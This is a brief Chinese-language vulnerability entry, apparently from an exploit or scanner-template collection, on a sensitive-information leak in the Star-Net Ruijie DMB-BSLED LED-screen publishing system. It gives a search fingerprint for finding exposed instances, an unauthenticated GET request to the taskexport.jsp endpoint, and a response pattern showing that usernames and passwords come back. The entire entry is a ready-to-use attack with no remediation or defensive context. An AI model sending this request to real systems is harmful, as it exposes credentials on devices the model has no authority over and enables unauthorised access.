# 星网锐捷DMB-BSLED屏信息发布系统敏感信息泄露

锐捷 ｜ 信息泄露 ｜ —
- **指纹**：`body="/dmb/js/locale/jquery-lang-zh_CN.js"`
- **请求**：`GET /dmb/out/taskexport.jsp?taskcode= HTTP/1.1`
- **响应特征**：200 ^(?=.*?user)(?=.*?pwd).*?$